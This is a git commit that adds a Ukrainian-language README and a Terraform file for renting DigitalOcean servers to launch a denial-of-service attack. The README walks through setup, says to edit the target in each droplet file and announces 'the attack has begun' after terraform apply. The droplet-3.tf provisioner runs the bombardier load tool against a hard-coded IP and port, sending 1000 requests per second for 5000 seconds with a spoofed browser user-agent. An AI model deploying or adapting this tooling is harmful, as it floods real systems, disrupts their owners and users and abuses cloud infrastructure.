893f70dfafd7bbb94c203b3afae94c75e4815ac3
palianytsia2022 <petropala2022@gmail.com>
2022-03-03 22:29:46 +0200

    added readme, two more droplets

---
+++ README.md
@@ -0,0 +1,25 @@
+Що знадобиться?
+1. Встановити https://www.terraform.io/downloads
+2. Зареєструватися на https://www.digitalocean.com/
+
+Інструкція
+
+1. Клонуємо цей рупозиторій
+2. ssh-keygen -f ~/Downloads/terraform -C "email@example.com"
+3. Створюємо DigitalOcean SSH Key тут https://cloud.digitalocean.com/account/security і копіюємо туди вміст terraform.pub
+Важливо: імʼя ключа має бути "terraform"
+4. Створюємо DigitalOcean токен https://cloud.digitalocean.com/account/api/tokens з правами на читання й запис, копіюємо - він нам знадобиться пізніше
+5. У кожному файлі droplet-*.tf редагуємо команду у рядку 30 - підставляємо актуальну ціль, параметри
+Пізніше зроблю аргументом.
+6. У терміналі, у директорії куди ви склонували репозиторій:
+terraform plan -var "do_token=DigitalOceanToken" -var "pvt_key=terraform" -var "ssh_src_ipv4=PublicIPv4"
+terraform apply -var "do_token=DigitalOceanToken" -var "pvt_key=terraform" -var "ssh_src_ipv4=PublicIPv4"
+Атака почалась.
+
+По закінченню вилучаємо створену раніше інфраструктуру: 
+terraform destroy -var "do_token=DigitalOceanToken" -var "pvt_key=terraform" -var "ssh_src_ipv4=PublicIPv4"
+За необхідності - змінюємо ціль і починаємо спочатку.
+
+
+
+ 
---
+++ droplet-3.tf
@@ -0,0 +1,33 @@
+resource "digitalocean_droplet" "droplet-3" {
+    image = "ubuntu-20-04-x64"
+    name = "droplet-3"
+    region = "ams3"
+    size = "s-1vcpu-1gb"
+    private_networking = true
+    ssh_keys = [
+      data.digitalocean_ssh_key.terraform.id
+    ]
+
+  connection {
+    host = self.ipv4_address
+    user = "root"
+    type = "ssh"
+    private_key = file(var.pvt_key)
+    timeout = "2m"
+  }
+
+  provisioner "remote-exec" {
+    inline = [
+      "export PATH=$PATH:/usr/bin",
+      # install basic deps
+      "sudo apt update",
+      "sudo apt-get -y install ca-certificates curl gnupg sb-release",
+      # Docker
+      "curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg",
+      "echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null",
+      "sudo apt update",
+      "sudo apt-get -y install docker-ce docker-ce-cli containerd.io",
+      "docker run -ti --rm alpine/bombardier -c 300 -H \"user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109\" -d 5000s -l --rate 1000 217.12.103.135:6500 --http2"
+    ]
+  }
+}
